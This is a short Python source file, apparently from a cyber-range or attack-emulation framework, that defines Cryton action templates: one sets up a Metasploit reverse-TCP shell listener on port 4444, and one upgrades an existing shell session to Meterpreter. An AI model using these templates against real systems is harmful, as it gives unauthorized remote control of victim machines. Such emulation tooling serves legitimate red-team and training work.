from cyst_models.cryton.actions.action import Action, ExternalResources


class SessionListener(Action):
    def __init__(self, message_id: int, caller_id: str, external_resources: ExternalResources):
        template = {
            "name": f"session-listener-{message_id}",
            "step_type": "worker/execute",
            "arguments": {
                "module": "metasploit",
                "module_arguments": {
                    "module_name": "multi/handler",
                    "datastore": {"payload": "python/shell_reverse_tcp", "LHOST": "0.0.0.0", "LPORT": 4444},
                },
            },
        }
        super().__init__(message_id, template, caller_id, external_resources)


class UpgradeSession(Action):
    def __init__(
        self, message_id: int, caller_id: str, external_resources: ExternalResources, session: int, lhost: str
    ):
        template = {
            "name": f"session-listener-{message_id}",
            "step_type": "worker/execute",
            "arguments": {
                "module": "metasploit",
                "module_arguments": {
                    "module_name": "multi/manage/shell_to_meterpreter",
                    "datastore": {
                        "LHOST": lhost,
                        "SESSION": session,
                    },
                },
            },
        }
        super().__init__(message_id, template, caller_id, external_resources)
